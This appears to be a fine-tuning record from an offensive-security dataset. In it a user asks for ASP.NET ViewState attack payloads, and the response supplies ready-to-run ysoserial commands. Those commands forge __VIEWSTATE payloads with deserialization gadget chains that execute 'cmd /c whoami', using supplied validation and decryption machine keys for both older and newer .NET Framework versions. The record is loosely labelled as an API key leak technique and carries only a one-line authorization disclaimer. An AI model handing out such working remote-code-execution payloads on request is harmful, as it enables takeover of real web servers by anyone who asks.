# SECRETS — web_offensive_elite_v2_sft

- source: web_offensive_elite_v2_sft
- class: secrets
- cwe: CWE-312

## Scenario

Explain the MAC Is Enabled And Encryption Is Enabled technique for API Key Leaks and list the concrete payloads I can try.

## Analysis / Response

**MAC Is Enabled And Encryption Is Enabled** — this technique applies to API Key Leaks. Use the following only against systems you are explicitly authorized to test. Here is the approach along with the concrete payloads from the reference:

Default validation algorithm is `HMACSHA256` and the default decryption algorithm is `AES`.

If the `__VIEWSTATEGENERATOR` is missing but the application uses .NET Framework version 4.0 or below, you can use the root of the app (e.g: `--apppath="/testaspx/"`).

* **.NET Framework < 4.5**, ASP.NET always accepts an unencrypted `__VIEWSTATE` if you remove the `__VIEWSTATEENCRYPTED` parameter from the request

    ```ps1
    .\ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "cmd /c whoami" --apppath="/testaspx/" --islegacy --validationalg="SHA1" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0" --isdebug
    ```

* **.NET Framework > 4.5**, the machineKey has the property: `compatibilityMode="Framework45"`

    ```ps1
    .\ysoserial.exe -p ViewState -g TextFormattingRunProperties -c "cmd /c whoami" --path="/somepath/testaspx/test.aspx" --apppath="/testaspx/" --decryptionalg="AES" --decryptionkey="34C69D15ADD80DA4788E6E3D02694230CF8E9ADFDA2708EF43CAEF4C5BC73887" --validationalg="HMACSHA256" --validationkey="70DBADBFF4B7A13BE67DD0B11B177936F8F3C98BCE2E0A4F222F7A769804D451ACDB196572FFF76106F33DCEA1571D061336E68B12CF0AF62D56829D2A48F1B0"
    ```
